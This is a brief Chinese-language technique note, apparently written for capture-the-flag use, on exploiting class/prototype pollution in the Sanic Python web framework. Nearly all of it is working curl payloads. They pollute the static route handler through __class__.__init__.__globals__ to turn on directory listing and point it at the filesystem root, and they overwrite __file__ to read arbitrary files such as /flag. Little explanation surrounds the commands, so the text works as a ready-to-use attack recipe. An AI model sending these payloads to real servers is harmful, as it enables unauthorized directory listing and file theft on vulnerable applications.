# Sanic 框架污染链
原型链污染不限于 Flask，Sanic 等其他 Python Web 框架同样可利用。Sanic 的路由系统中注册了静态文件处理器，可通过污染实现目录列举和任意文件读取。

## 静态路由污染

```bash
# Sanic 静态路由污染: 开启目录浏览 + 修改目录为根目录
# 1. 开启 directory_view
curl -X POST http://target/admin \
  -H 'Content-Type: application/json' \
  -d '{"key": "__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view", "value": true}'

# 2. 修改静态目录为根目录
curl -X POST http://target/admin \
  -H 'Content-Type: application/json' \
  -d '{"key": "__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory._parts", "value": ["/"]}'

# 3. 访问 /static/ 列出根目录文件
curl http://target/static/
```

## __file__ 污染

`__file__` 污染也是通用技巧 — 当代码中有 `open(__file__).read()` 时，修改 `__file__` 可读取任意文件：

```bash
curl -X POST http://target/admin \
  -H 'Content-Type: application/json' \
  -d '{"key": "__class__\\\\.__init__\\\\.__globals__\\\\.__file__", "value": "/flag"}'
# 然后访问读取 __file__ 的端点（如 /src）
curl http://target/src
```
